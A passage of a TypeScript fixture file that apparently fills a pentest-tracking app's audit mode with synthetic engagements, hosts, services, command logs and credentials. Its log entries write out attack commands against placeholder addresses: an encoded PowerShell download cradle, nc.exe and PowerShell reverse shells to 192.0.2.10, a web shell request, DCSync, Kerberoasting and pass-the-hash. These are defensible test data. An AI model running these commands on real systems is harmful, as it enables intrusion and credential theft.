// Synthetic stress data for audit mode. Nothing here is real: documentation-style names, invented 10.10.x.x target
// addresses, RFC 5737 addresses (192.0.2.10 for the attacker; 198.51.100.x and example.test for the Payloads drill)
// and placeholder secrets only. Timestamps are relative to AUDIT_NOW so screenshots are stable.
import type { PayloadBuild } from "../types/payloadBuild";
import type { AccessGrant, CredAttempt, Credential, TriedPair, Username } from "../types/credentials";
import type { ChecklistItem } from "../types/checklist";
import type { CleanupItem } from "../types/cleanup";
import type { BackupInfo } from "../types/backup";
import type { Engagement } from "../types/engagement";
import type { FailedAttempt, Finding, FindingFile } from "../types/findings";
import type { Host } from "../types/host";
import type { Attachment, Extraction, LogEntry, Progress } from "../types/log";
import type { HostIdentity, PrivescVector } from "../types/hostFacts";
import type { Hop, Tunnel } from "../types/network";
import type { Note, RuledOut } from "../types/notes";
import type { Service } from "../types/service";
import type { Settings } from "../types/settings";
import { AUDIT_PNGS } from "./images";

export const AUDIT_IDS = {
  labEngagement: "e-lab",
  examEngagement: "e-exam",
  archivedEngagement: "e-old",
  webHost: "h-web",
  dcHost: "h-dc01",
  fileHost: "h-fs01",
  msfHost: "h-exam-ms01",
  payloadsEngagement: "e-pay",
  iisHost: "h-pay-iis",
  pgHost: "h-pay-pg",
  boardEngagement: "e-board",
  findingsListEngagement: "e-fl",
} as const;

/** 2026-11-05 14:00 UTC. The browser clock is frozen here when auditing. */
export const AUDIT_NOW = Date.UTC(2026, 10, 5, 14, 0);

const MIN = 60_000;
const HOUR = 60 * MIN;
const ago = (ms: number) => AUDIT_NOW - ms;

export interface AuditFixtures {
  engagements: Engagement[];
  hosts: Host[];
  services: Service[];
  log: LogEntry[];
  attachments: Attachment[];
  checklist: ChecklistItem[];
  notes: Note[];
  ruledOut: RuledOut[];
  hostIdentity: HostIdentity[];
  vectors: PrivescVector[];
  tunnels: Tunnel[];
  hops: Hop[];
  credentials: Credential[];
  usernames: Username[];
  credAttempts: CredAttempt[];
  triedPairs: TriedPair[];
  payloadBuilds: PayloadBuild[];
  extractions: Extraction[];
  accessGrants: AccessGrant[];
  findings: Finding[];
  findingFiles: FindingFile[];
  failedAttempts: FailedAttempt[];
  cleanup: CleanupItem[];
  backups: BackupInfo[];
  settings: Settings;
}

// ---------------------------------------------------------------- engagements

const LAB_NAME = "Acme Corp — internal segment B (10.10.20.0/24) with the long-named finance DMZ";

const engagements: Engagement[] = [
  {
    id: "e-lab", name: LAB_NAME, kind: "lab", client: null, subLabel: "PEN-200 lab, challenge 3 (long-running)",
    scopeCidrs: ["10.10.20.0/24", "10.10.21.0/24"], domain: "acme.corp", startsAt: null, endsAt: null,
    timeboxStart: null, timeboxMinutes: null, status: "active", createdAt: ago(72 * HOUR), updatedAt: ago(5 * MIN),
    lastActivityAt: ago(5 * MIN), lastRanOn: "Kali (VM)", msfHostId: null,
  },
  {
    id: "e-exam", name: "Mock exam 2", kind: "exam-sim", client: null, subLabel: "Set B",
    scopeCidrs: ["10.10.30.0/24"], domain: "exam.corp", startsAt: null, endsAt: null,
    timeboxStart: ago(3 * HOUR), timeboxMinutes: 1425, status: "active", createdAt: ago(3 * HOUR),
    updatedAt: ago(20 * MIN), lastActivityAt: ago(20 * MIN), lastRanOn: "Kali (VM)", msfHostId: "h-exam-ms01",
  },
  {
    id: "e-old", name: "Contoso web assessment", kind: "client", client: "Contoso Ltd", subLabel: null,
    scopeCidrs: ["10.60.5.0/24"], domain: null, startsAt: ago(40 * 24 * HOUR), endsAt: ago(30 * 24 * HOUR),
    timeboxStart: null, timeboxMinutes: null, status: "archived", createdAt: ago(45 * 24 * HOUR),
    updatedAt: ago(29 * 24 * HOUR), lastActivityAt: ago(30 * 24 * HOUR), lastRanOn: null, msfHostId: null,
  },
  // Payloads: RFC 5737 addresses and example.test names only. Older than e-lab, so /arsenal and /payloads still
  // default to e-lab when opened directly.
  {
    id: "e-pay", name: "Payloads drill", kind: "lab", client: null, subLabel: null,
    scopeCidrs: ["198.51.100.0/24"], domain: "example.test", startsAt: null, endsAt: null,
    timeboxStart: null, timeboxMinutes: null, status: "active", createdAt: ago(48 * HOUR), updatedAt: ago(24 * HOUR),
    lastActivityAt: ago(24 * HOUR), lastRanOn: "Kali (VM)", msfHostId: null,
  },
  // Board stress: a 20-host lane next to empty lanes (RFC 5737 addresses, example.test names). Archived, so it only
  // adds one row to the dashboard's past table.
  {
    id: "e-board", name: "Board sweep", kind: "lab", client: null, subLabel: null,
    scopeCidrs: ["203.0.113.0/24"], domain: "example.test", startsAt: null, endsAt: null,
    timeboxStart: null, timeboxMinutes: null, status: "archived", createdAt: ago(20 * 24 * HOUR),
    updatedAt: ago(19 * 24 * HOUR), lastActivityAt: ago(19 * 24 * HOUR), lastRanOn: "Kali (VM)", msfHostId: null,
  },
  // Findings list: every severity, long titles and host names, attempts with and without a log entry. Archived, so it
  // only adds one row to the dashboard's past table.
  {
    id: "e-fl", name: "Findings list drill", kind: "lab", client: null, subLabel: null,
    scopeCidrs: ["192.0.2.0/24"], domain: "example.test", startsAt: null, endsAt: null,
    timeboxStart: null, timeboxMinutes: null, status: "archived", createdAt: ago(18 * 24 * HOUR),
    updatedAt: ago(17 * 24 * HOUR), lastActivityAt: ago(17 * 24 * HOUR), lastRanOn: "Kali (VM)", msfHostId: null,
  },
];

// ---------------------------------------------------------------- hosts

const host = (id: string, engagementId: string, name: string, ip: string, os: Host["os"], over: Partial<Host> = {}): Host => ({
  id, engagementId, name, ip, os, boardColumn: "information-gathering", boardManual: false, access: "none",
  createdAt: ago(60 * HOUR), updatedAt: ago(HOUR), dualHomed: false, boardDerived: null, accessReviewedAt: null,
  adSet: null, adSetEffective: false, ...over,
});

const WEB_NAME = "web-portal-dmz-frontend-01.dmz.acme.corp";

const hosts: Host[] = [
  host("h-web", "e-lab", WEB_NAME, "10.10.20.15", "linux", { boardColumn: "vulnerability-detection", access: "user", boardDerived: "vulnerability-detection" }),
  host("h-dc01", "e-lab", "dc01", "10.10.20.10", "windows", { boardColumn: "privilege-escalation", access: "root", adSet: true, adSetEffective: true, boardDerived: "privilege-escalation" }),
  host("h-fs01", "e-lab", "fs01", "10.10.20.21", "windows", { boardColumn: "initial-foothold", access: "user", adSet: true, adSetEffective: true }),
  host("h-sql01", "e-lab", "sql01", "10.10.20.22", "windows", { boardColumn: "post-exploitation", access: "user", adSet: true, adSetEffective: true }),
  host("h-pivot", "e-lab", "pivot-gw", "10.10.20.30", "windows", { boardColumn: "reporting", access: "root", dualHomed: true }),
  host("h-ws07", "e-lab", "ws07", "10.10.20.57", "linux"),
  host("h-exam-ms01", "e-exam", "ms01", "10.10.30.5", "windows", { boardColumn: "initial-foothold", access: "user" }),
  host("h-exam-dc01", "e-exam", "dc01", "10.10.30.10", "windows", { adSet: true, adSetEffective: true }),
  host("h-exam-ad02", "e-exam", "ad02", "10.10.30.11", "windows", { adSet: true, adSetEffective: true, boardColumn: "vulnerability-detection" }),
  host("h-exam-web", "e-exam", "web01", "10.10.30.20", "linux", { boardColumn: "privilege-escalation", access: "user" }),
  host("h-exam-lnx", "e-exam", "lnx02", "10.10.30.21", "linux"),
  // A long name, so the drawer's host chip is at its widest next to "Paste into Web shell ?cmd=".
  host("h-pay-iis", "e-pay", "intranet-gateway-iis-frontend-07.corp.example.test", "198.51.100.20", "windows", { boardColumn: "initial-foothold", access: "user" }),
  host("h-pay-pg", "e-pay", "pg01.example.test", "198.51.100.30", "linux"),
  host("h-old-1", "e-old", "shop.contoso.example", "10.60.5.10", "linux", { boardColumn: "reporting", access: "root" }),
  // Board sweep: 20 hosts in information gathering; post-exploitation and reporting stay empty. Placed by hand
  // (boardManual), so the board's auto-sync leaves the lanes as written.
  ...Array.from({ length: 20 }, (_, i) => {
    const os: Host["os"][] = ["windows", "linux", "other", null];
    const name = i === 0 ? "file-server-replica-backup-node-03.branch.example.test" : `ws${String(i + 1).padStart(2, "0")}.example.test`;
    return host(`h-board-${i + 1}`, "e-board", name, `203.0.113.${i + 10}`, os[i % 4], { access: i % 5 === 0 ? "user" : "none", boardManual: true });
  }),
  host("h-board-vd", "e-board", "mail.example.test", "203.0.113.40", "windows", { boardColumn: "vulnerability-detection", boardManual: true }),
  host("h-board-if", "e-board", "intranet-gateway-iis-frontend-07.example.test", "203.0.113.41", "windows", { boardColumn: "initial-foothold", access: "user", boardManual: true }),
  host("h-board-pe", "e-board", "db.example.test", "203.0.113.42", "linux", { boardColumn: "privilege-escalation", access: "root", boardManual: true }),
  host("h-fl-1", "e-fl", "app-server-replica-backup-node-03.branch-office.example.test", "192.0.2.10", "linux", { access: "user" }),
  host("h-fl-2", "e-fl", "dc01.example.test", "192.0.2.11", "windows", { access: "root" }),
  host("h-fl-3", "e-fl", "fs01.example.test", "192.0.2.12", "windows"),
  host("h-fl-4", "e-fl", "web01.example.test", "192.0.2.13", "linux"),
];

// ---------------------------------------------------------------- services

let svcN = 0;
const svc = (hostId: string, port: number, nmapService: string | null, nmapVersion: string | null, over: Partial<Service> = {}): Service => ({
  id: `s-${++svcN}`, hostId, port, protocol: "tcp", state: "open", nmapService, nmapVersion,
  confirmedProduct: null, confirmedVersion: null, confirmedEntryId: null, verdict: null, createdAt: ago(50 * HOUR), updatedAt: ago(50 * HOUR), ...over,
});
const confirmed = (product: string, version: string | null): Partial<Service> => ({ confirmedProduct: product, confirmedVersion: version });
const udp = (hostId: string, port: number, name: string | null): Service =>
  svc(hostId, port, name, null, { protocol: "udp", state: "open|filtered" });

const services: Service[] = [
  // 24 on the long-named web host: 19 TCP, 5 UDP open|filtered.
  svc("h-web", 21, "ftp", "vsftpd 3.0.3", { verdict: "dead_end" }),
  svc("h-web", 22, "ssh", "OpenSSH 8.9p1 Ubuntu 3ubuntu0.6", confirmed("OpenSSH", "8.9p1")),
  svc("h-web", 25, "smtp", "Postfix smtpd"),
  svc("h-web", 53, "domain", "ISC BIND 9.18.18"),
  svc("h-web", 80, "http", "Apache httpd 2.4.52 ((Ubuntu))", { ...confirmed("Apache httpd", "2.4.52"), verdict: "candidate" }),
  svc("h-web", 110, "pop3", "Dovecot pop3d"),
  svc("h-web", 111, "rpcbind", "2-4 (RPC #100000)"),
  svc("h-web", 143, "imap", "Dovecot imapd (Ubuntu)"),
  svc("h-web", 443, "ssl/http", "nginx 1.18.0 (Ubuntu)", confirmed("nginx", "1.18.0")),
  svc("h-web", 445, "netbios-ssn", "Samba smbd 4.6.2", { verdict: "untested" }),
  svc("h-web", 993, "ssl/imap", "Dovecot imapd (Ubuntu)"),
  svc("h-web", 995, "ssl/pop3", "Dovecot pop3d"),
  svc("h-web", 2049, "nfs", "3-4 (RPC #100003)"),
  svc("h-web", 3306, "mysql", "MySQL 8.0.36-0ubuntu0.22.04.1", confirmed("MySQL", "8.0.36")),
  svc("h-web", 5432, "postgresql", "PostgreSQL DB 14.10 - 14.11"),
  svc("h-web", 6379, "redis", "Redis key-value store 6.0.16"),
  svc("h-web", 8080, "http-proxy", null),
  svc("h-web", 8443, "ssl/https-alt", "Apache Tomcat 9.0.58"),
  svc("h-web", 9200, "wap-wsp?", null),
  udp("h-web", 53, "domain"),
  udp("h-web", 69, "tftp"),
  udp("h-web", 123, "ntp"),
  udp("h-web", 161, "snmp"),
  udp("h-web", 500, "isakmp"),

  // dc01
  svc("h-dc01", 53, "domain", "Simple DNS Plus"),
  svc("h-dc01", 88, "kerberos-sec", "Microsoft Windows Kerberos", confirmed("Microsoft Kerberos", null)),
  svc("h-dc01", 135, "msrpc", "Microsoft Windows RPC"),
  svc("h-dc01", 389, "ldap", "Microsoft Windows Active Directory LDAP (Domain: acme.corp)", confirmed("Active Directory LDAP", null)),
  svc("h-dc01", 445, "microsoft-ds?", null),
  svc("h-dc01", 636, "ssl/ldap", "Microsoft Windows Active Directory LDAP"),
  svc("h-dc01", 3268, "ldap", "Microsoft Windows Active Directory LDAP"),
  svc("h-dc01", 5985, "http", "Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)", confirmed("WinRM", null)),

  // fs01, sql01
  svc("h-fs01", 88, "kerberos-sec", "Microsoft Windows Kerberos"),
  svc("h-fs01", 135, "msrpc", "Microsoft Windows RPC"),
  svc("h-fs01", 389, "ldap", "Microsoft Windows Active Directory LDAP"),
  svc("h-fs01", 445, "microsoft-ds?", null, confirmed("SMB", "3.1.1")),
  svc("h-fs01", 3389, "ms-wbt-server", "Microsoft Terminal Services", { verdict: "dead_end" }),
  svc("h-sql01", 88, "kerberos-sec", "Microsoft Windows Kerberos"),
  svc("h-sql01", 389, "ldap", "Microsoft Windows Active Directory LDAP"),
  svc("h-sql01", 445, "microsoft-ds?", null),
  svc("h-sql01", 1433, "ms-sql-s", "Microsoft SQL Server 2019 15.00.2000", confirmed("Microsoft SQL Server", "2019")),
  svc("h-sql01", 5985, "http", "Microsoft HTTPAPI httpd 2.0"),

  // pivot, ws07
  svc("h-pivot", 135, "msrpc", "Microsoft Windows RPC"),
  svc("h-pivot", 445, "microsoft-ds?", null),
  svc("h-pivot", 3389, "ms-wbt-server", "Microsoft Terminal Services"),
  svc("h-pivot", 8000, "http", "Python http.server 3.10"),
  svc("h-ws07", 22, "ssh", "OpenSSH 8.4p1 Debian"),
  svc("h-ws07", 5900, "vnc", "VNC (protocol 3.8)"),

  // exam
  svc("h-exam-ms01", 80, "http", "Microsoft IIS httpd 10.0", confirmed("IIS", "10.0")),
  svc("h-exam-ms01", 445, "microsoft-ds?", null),
  svc("h-exam-ms01", 1433, "ms-sql-s", "Microsoft SQL Server 2019"),
  svc("h-exam-dc01", 88, "kerberos-sec", "Microsoft Windows Kerberos"),
  svc("h-exam-dc01", 389, "ldap", "Microsoft Windows Active Directory LDAP"),
  svc("h-exam-dc01", 445, "microsoft-ds?", null),
  svc("h-exam-ad02", 88, "kerberos-sec", "Microsoft Windows Kerberos"),
  svc("h-exam-ad02", 389, "ldap", "Microsoft Windows Active Directory LDAP"),
  svc("h-exam-web", 22, "ssh", "OpenSSH 8.2p1"),
  svc("h-exam-web", 80, "http", "Apache httpd 2.4.41", confirmed("Apache httpd", "2.4.41")),
  svc("h-exam-lnx", 22, "ssh", "OpenSSH 7.6p1"),
  svc("h-pay-iis", 80, "http", "Microsoft IIS httpd 10.0", confirmed("IIS", "10.0")),
  svc("h-pay-iis", 445, "microsoft-ds?", null),
  svc("h-pay-pg", 22, "ssh", "OpenSSH 8.9p1 Ubuntu 3ubuntu0.6"),
  svc("h-pay-pg", 5432, "postgresql", "PostgreSQL DB 14.10 - 14.11"),
  svc("h-old-1", 443, "ssl/http", "nginx 1.22.1"),
];

// ---------------------------------------------------------------- log

const BLOB = btoa("IEX (New-Object Net.WebClient).DownloadString('http://192.0.2.10/stage2.ps1'); Invoke-Beacon -Sleep 30 ".repeat(5)).slice(0, 372);
const LONG_ONE_LINER = `powershell.exe -nop -w hidden -ep bypass -enc ${BLOB}`;
const LONG_PATH = String.raw`C:\Program Files (x86)\Acme Corp\Finance Suite\Reporting Services\Deployment\Config\Prod\connection.config`;
const SHORT_FLAGS = "rustscan --ulimit=5000 --range=1-65535";
const MULTILINE_OUTPUT = [
  "Starting Nmap 7.94 ( https://nmap.org ) at 2026-11-05 13:12 UTC",
  "Nmap scan report for web-portal-dmz-frontend-01.dmz.acme.corp (10.10.20.15)",
  "PORT     STATE SERVICE     VERSION",
  "22/tcp   open  ssh         OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)",
  "80/tcp   open  http        Apache httpd 2.4.52 ((Ubuntu))",
  "|_http-title: Acme Finance Portal | Sign in to continue to the reporting dashboard and monthly statements",
  "445/tcp  open  netbios-ssn Samba smbd 4.6.2",
  "3306/tcp open  mysql       MySQL 8.0.36-0ubuntu0.22.04.1",
  "",
  "Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .",
  "Nmap done: 1 IP address (1 host up) scanned in 14.52 seconds",
].join("\n");

let logN = 0;
const entry = (over: Partial<LogEntry> & Pick<LogEntry, "kind" | "title" | "content">): LogEntry => {
  const n = ++logN;
  const at = over.at ?? ago((120 - n * 3) * MIN);
  return {
    id: `l-${n}`, engagementId: "e-lab", titleEdited: false, ranOn: "Kali (VM)", hostIds: [], observations: null,
    returnedNothing: false, private: false, at, createdAt: at, updatedAt: at, ...over,
  };
};
const cmd = (title: string, command: string, output: string, hostIds: string[] = ["h-web"], over: Partial<LogEntry> = {}) =>
  entry({ kind: "command", title, hostIds, content: { kind: "command", blocks: [{ command, output }] }, ...over });
const note = (title: string, text: string, hostIds: string[] = [], over: Partial<LogEntry> = {}) =>
  entry({ kind: "note", title, hostIds, content: { kind: "note", text }, ...over });
// As saved by capture, the title is the caption (so the log shows it once); `caption` overrides that for a shot whose
// caption says more than its title.
const shot = (key: keyof typeof AUDIT_PNGS, title: string, hostIds: string[], caption = title) =>
  entry({ kind: "screenshot", title, hostIds, content: { kind: "screenshot", attachmentId: `a-${key}`, caption, fileName: `${key}.png` } });

const labLog: LogEntry[] = [
  cmd("Full TCP scan of the web host", "nmap -p- -sV -sC -T4 10.10.20.15 -oA scans/web-full", MULTILINE_OUTPUT),
  cmd("Fast port sweep (short flags)", SHORT_FLAGS, "Open 10.10.20.15:22\nOpen 10.10.20.15:80\nOpen 10.10.20.15:445"),
  cmd("Encoded PowerShell stager", LONG_ONE_LINER, "", ["h-fs01"], { returnedNothing: true, observations: "No callback; AMSI likely blocked the download cradle." }),
  cmd("Read the finance connection string", `type "${LONG_PATH}"`, `<connectionStrings>\n  <add name="Finance" connectionString="Server=sql01.acme.corp;Database=Finance;User Id=svc_report;Password=Password123!;" />\n</connectionStrings>`, ["h-fs01"]),
  cmd("SMB share listing on dc01", "nxc smb 10.10.20.10 -u svc_backup -p 'Password123!' --shares", "SMB  10.10.20.10  445  DC01  [+] acme.corp\\svc_backup:Password123!\nSMB  10.10.20.10  445  DC01  Share      Permissions  Remark\nSMB  10.10.20.10  445  DC01  SYSVOL     READ         Logon server share", ["h-dc01"]),
  cmd("Kerberoast", "impacket-GetUserSPNs acme.corp/svc_backup:'Password123!' -dc-ip 10.10.20.10 -request", "ServicePrincipalName  Name     MemberOf\nMSSQLSvc/sql01.acme.corp:1433  svc_sql  CN=Domain Users", ["h-dc01", "h-sql01"]),
  cmd("Crack the TGS hash", "hashcat -m 13100 kerb.hash /usr/share/wordlists/rockyou.txt", "Status...........: Cracked\nRecovered........: 1/1 (100.00%) Digests", ["h-sql01"]),
  cmd("DCSync", "impacket-secretsdump -just-dc acme.corp/Administrator@10.10.20.10 -hashes :aad3b435b51404eeaad3b435b51404ee", "Administrator:500:aad3b435b51404eeaad3b435b51404ee:0123456789abcdef0123456789abcdef:::", ["h-dc01"]),
  cmd("Web directory brute force", "feroxbuster -u http://10.10.20.15 -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,txt -t 50", "200  GET  1l  1w  12c  http://10.10.20.15/\n301  GET  9l  28w  315c  http://10.10.20.15/admin\n403  GET  9l  28w  277c  http://10.10.20.15/server-status"),
  cmd("Anonymous FTP check", "ftp 10.10.20.15", "Connected to 10.10.20.15.\n220 (vsFTPd 3.0.3)\nName: anonymous\n530 Login incorrect.", ["h-web"], { returnedNothing: true }),
  cmd("Tunnel agent start", "./agent -connect 192.0.2.10:11601 -ignore-cert", "INFO[0000] Connection established  addr=\"192.0.2.10:11601\"", ["h-pivot"]),
  cmd("Second subnet sweep through the tunnel", "nmap -sn 10.10.21.0/24", "Nmap scan report for 10.10.21.4\nNmap scan report for 10.10.21.9", ["h-pivot"]),
  cmd("MSSQL xp_cmdshell", "impacket-mssqlclient acme.corp/svc_sql:'Password123!'@10.10.20.22 -windows-auth", "SQL> EXEC xp_cmdshell 'whoami'\nacme\\svc_sql", ["h-sql01"]),
  cmd("WinRM shell on dc01", "evil-winrm -i 10.10.20.10 -u Administrator -H 0123456789abcdef0123456789abcdef", "*Evil-WinRM* PS C:\\Users\\Administrator\\Documents> whoami\nacme\\administrator", ["h-dc01"]),
  cmd("SNMP walk", "snmpwalk -v2c -c public 10.10.20.15 1.3.6.1.2.1.25.4.2.1.2", "iso.3.6.1.2.1.25.4.2.1.2.1 = STRING: \"systemd\"\niso.3.6.1.2.1.25.4.2.1.2.412 = STRING: \"apache2\"", ["h-web"]),
  cmd("Reverse shell listener", "rlwrap nc -lvnp 4444", "listening on [any] 4444 ...\nconnect to [192.0.2.10] from (UNKNOWN) [10.10.20.15] 51514\nwww-data@web:/var/www/html$", ["h-web"]),
  entry({ kind: "http", title: "Login request with an oversized JWT cookie", hostIds: ["h-web"], content: { kind: "http", request: `GET /admin/reports?month=2026-10&format=csv&token=${BLOB} HTTP/1.1\nHost: web-portal-dmz-frontend-01.dmz.acme.corp\nCookie: session=${BLOB.slice(0, 120)}\n\n`, response: "HTTP/1.1 403 Forbidden\nContent-Type: text/html\nContent-Length: 277\n\n<h1>Forbidden</h1>" } }),
  entry({ kind: "http", title: "Upload form probe", hostIds: ["h-web"], content: { kind: "http", request: "POST /upload HTTP/1.1\nHost: 10.10.20.15\nContent-Type: multipart/form-data; boundary=x\n\n--x\nContent-Disposition: form-data; name=\"f\"; filename=\"a.php\"\n\n<?php echo 1;\n--x--", response: null } }),
  note("A very long note title that keeps going to see how the log row handles a heading with no natural break points at all", "Found the finance DMZ gateway. It has a second NIC on 10.10.21.0/24 which is not in scope yet; confirm with the lab guide before touching it.", ["h-pivot"]),
  note("Password reuse theory", "svc_backup and svc_report share a password pattern: Season+Year+!. Try it against the other service accounts.", [], { private: true }),
  note("Loose end", "Check the NFS export on the web host.", ["h-web"]),
  entry({ kind: "flag", title: "local.txt on web", hostIds: ["h-web"], content: { kind: "flag", flagKind: "local", value: "0123456789abcdef0123456789abcdef", attachmentId: null, proof: "www-data@web:/home/dev$ cat local.txt && hostname && ip a" } }),
  entry({ kind: "flag", title: "proof.txt on dc01", hostIds: ["h-dc01"], content: { kind: "flag", flagKind: "proof", value: "fedcba9876543210fedcba9876543210", attachmentId: "a-tiny", proof: null } }),
  shot("wide", "Terminal strip: full nmap output on one line", ["h-web"]),
  shot("tall", "Long tool output captured top to bottom", ["h-dc01"]),
  shot("hd", "Desktop of the file server", ["h-fs01"], "Desktop of the file server: the finance share is mapped as F:"),
  shot("tiny", "Cropped proof of the hostname", ["h-dc01"]),
  cmd("Local administrators on fs01", "net localgroup administrators", "Alias name     administrators\nMembers\n---\nAdministrator\nACME\\Domain Admins\nACME\\svc_backup", ["h-fs01"]),
  cmd("Share with a long UNC path", "dir \\\\fs01.acme.corp\\Finance$\\Quarterly Reports\\2026\\Q3\\Board Pack — Draft v7 (Reviewed by Legal).xlsx", " Volume in drive \\\\fs01 has no label.\n 11/04/2026  09:14 AM    18,204,672 Board Pack — Draft v7 (Reviewed by Legal).xlsx", ["h-fs01"]),
];

const examLog: LogEntry[] = [
  note("Exam started", "Timebox running. Metasploit reserved for ms01 only.", [], { engagementId: "e-exam", at: ago(3 * HOUR) }),
  cmd("Initial scan", "nmap -p- -sV 10.10.30.0/24", "Nmap done: 256 IP addresses (5 hosts up)", ["h-exam-ms01"], { engagementId: "e-exam", at: ago(2.5 * HOUR) }),
  cmd("Web enumeration", "gobuster dir -u http://10.10.30.20 -w common.txt", "/admin (Status: 301)", ["h-exam-web"], { engagementId: "e-exam", at: ago(2 * HOUR) }),
].map((e, i) => ({ ...e, id: `l-exam-${i + 1}` }));

// The IIS host: a ?cmd= web shell that answers (so the paste context is "Web shell ?cmd="), then an nc.exe payload
// logged from the drawer that failed there (so nc-exe stays a fit, marked "Failed here before").
const payLog: LogEntry[] = [
  cmd(
    "Web shell answers", `curl "http://198.51.100.20/uploads/probe.aspx?cmd=whoami"`, "iis apppool\\defaultapppool", ["h-pay-iis"],
    { engagementId: "e-pay", at: ago(26 * HOUR) },
  ),
  cmd(
    "nc.exe -e · 198.51.100.20", "nc.exe 192.0.2.10 443 -e cmd.exe",
    "'nc.exe' is not recognized as an internal or external command,\noperable program or batch file.", ["h-pay-iis"],
    { engagementId: "e-pay", at: ago(25 * HOUR), payloadId: "nc-exe", payloadValues: { LHOST: "192.0.2.10", LPORT: "443" } },
  ),
  // A second reverse shell that failed here: two failures make the Callbacks chip amber ("Callbacks failed here twice").
  cmd(
    "PowerShell TLS shell · 198.51.100.20", "$c=New-Object Net.Sockets.TCPClient('192.0.2.10',443)",
    "Access is denied.", ["h-pay-iis"],
    { engagementId: "e-pay", at: ago(24 * HOUR), payloadId: "ps-tls", payloadValues: { LHOST: "192.0.2.10", LPORT: "443" } },
  ),
].map((e, i) => ({ ...e, id: `l-pay-${i + 1}` }));

// The Nishang cradle was built for an older LHOST, so its block opens with "Rebuild first: built with ..., now ...".
const payloadBuilds: PayloadBuild[] = [
  { engagementId: "e-pay", hostId: "h-pay-iis", payloadId: "nishang-cradle", lhost: "192.0.2.77", lport: "4444", at: ago(30 * HOUR) },
];

const log: LogEntry[] = [...labLog, ...examLog, ...payLog];

const attachments: Attachment[] = (Object.keys(AUDIT_PNGS) as (keyof typeof AUDIT_PNGS)[]).map((k) => ({
  id: `a-${k}`, mime: "image/png", dataBase64: AUDIT_PNGS[k].base64,
}));

// ---------------------------------------------------------------- credentials (domain scope except one local account, all newer than the done goal)

const cred = (n: number, type: Credential["type"], username: string, secret: string, over: Partial<Credential> = {}): Credential => ({
  id: `c-${n}`, engagementId: "e-lab", type, username, domain: "ACME", secret, hashType: null, scope: "domain",
  localHostId: null, sourceHostId: "h-dc01", source: null, notes: null, crackStatus: null, crackedFrom: null,
  fromSecretId: null, createdAt: ago((100 - n * 5) * MIN), updatedAt: ago((100 - n * 5) * MIN), ...over,
});
const NT = (n: number) => `${n.toString(16).padStart(2, "0").repeat(16)}`;

const credentials: Credential[] = [
  cred(1, "password", "svc_backup", "Password123!", { source: "GPP cpassword in SYSVOL" }),
  cred(2, "password", "svc_report", "Winter2026!", { sourceHostId: "h-fs01", source: "web.config on fs01" }),
  cred(3, "hash", "Administrator", NT(0xab), { hashType: "NTLM", crackStatus: "uncracked", source: "DCSync" }),
  cred(4, "hash", "krbtgt", NT(0xcd), { hashType: "NTLM", crackStatus: "uncrackable", source: "DCSync" }),
  cred(5, "hash", "svc_sql", NT(0x5e), { hashType: "NTLM", crackStatus: "cracked", crackedFrom: "rockyou.txt", source: "Kerberoast" }),
  cred(6, "password", "svc_sql", "Sunshine1!", { sourceHostId: "h-sql01", source: "cracked from the NTLM hash", fromSecretId: "c-5" }),
  cred(7, "hash", "j.harper", NT(0x71), { hashType: "NTLM", crackStatus: "uncracked", sourceHostId: "h-fs01" }),
  cred(8, "hash", "m.okafor", NT(0x82), { hashType: "NTLM", crackStatus: "cracked", sourceHostId: "h-fs01" }),
  cred(9, "password", "m.okafor", "Autumn2026#", { sourceHostId: "h-fs01", fromSecretId: "c-8" }),
  cred(10, "hash", "a.lindqvist-with-an-extraordinarily-long-service-account-name", NT(0x93), { hashType: "NTLM", crackStatus: "uncracked", domain: "ACME-DMZ" }),
  cred(11, "password", "backup-operator", "Password123!", { domain: null, scope: "local", localHostId: "h-fs01", source: "local SAM dump on fs01", notes: "Found in a sticky note file on the desktop." }),
  cred(12, "hash", "ws07$", `aad3b435b51404eeaad3b435b51404ee:${NT(0xa4)}`, { hashType: "pwdump", crackStatus: "uncrackable", sourceHostId: "h-ws07" }),
];

const usernames: Username[] = [
  { id: "u-1", engagementId: "e-lab", username: "j.harper", domain: "ACME", sourceHostId: "h-dc01", source: "rpcclient enumdomusers", createdAt: ago(80 * MIN) },
  { id: "u-2", engagementId: "e-lab", username: "t.nakamura", domain: "ACME", sourceHostId: "h-dc01", source: "kerbrute", createdAt: ago(78 * MIN) },
];

const triedPairs: TriedPair[] = [
  { id: "tp-1", engagementId: "e-lab", username: "drew", domain: "acme.corp", secret: "Guess1", secretKind: "password", hostId: "h-dc01", service: "smb", authMode: "domain", logEntryId: "l-5", at: ago(65 * MIN) },
  { id: "tp-2", engagementId: "e-lab", username: "drew", domain: "acme.corp", secret: "Guess1", secretKind: "password", hostId: "h-fs01", service: "smb", authMode: "domain", logEntryId: "l-5", at: ago(65 * MIN) },
];

// One saved entry with an extraction, so the log's "Extracted" line has something to show.
const extractions: Extraction[] = [
  {
    logEntryId: "l-5", engagementId: "e-lab", createdAt: ago(70 * MIN), undoneAt: null,
    summary: { wins: ["svc_backup:Password123! works on SMB, DC01"], counts: ["+2 tried pairs"], ticks: [] },
    record: {
      createdHostIds: [], createdServiceIds: [], servicesBefore: [], hostOsBefore: [], identityBefore: [], createdCredentialIds: [], credentialsBefore: [],
      createdUsernameIds: [], createdAttemptIds: [], attemptsBefore: [], createdTriedPairIds: ["tp-1", "tp-2"], createdVectorIds: [], outputTicks: [],
      reprovedCredentialIds: [], reprovedUsernameIds: [],
    },
  },
];

const credAttempts: CredAttempt[] = [
  { id: "ca-1", engagementId: "e-lab", credId: "c-1", usernameId: null, hostId: "h-dc01", service: "smb", port: 445, result: "valid", authMode: "domain", detail: null, logEntryId: "l-5", at: ago(70 * MIN) },
  { id: "ca-2", engagementId: "e-lab", credId: "c-3", usernameId: null, hostId: "h-dc01", service: "winrm", port: 5985, result: "admin", authMode: "domain", detail: "Pwn3d!", logEntryId: "l-14", at: ago(40 * MIN) },
  { id: "ca-3", engagementId: "e-lab", credId: "c-6", usernameId: null, hostId: "h-sql01", service: "mssql", port: 1433, result: "valid", authMode: "domain", detail: null, logEntryId: "l-13", at: ago(45 * MIN) },
  { id: "ca-4", engagementId: "e-lab", credId: "c-2", usernameId: null, hostId: "h-fs01", service: "smb", port: 445, result: "failed", authMode: "domain", detail: "STATUS_LOGON_FAILURE", logEntryId: null, at: ago(60 * MIN) },
  // A password that works on fs01: the Arsenal's credential chip should offer it first there.
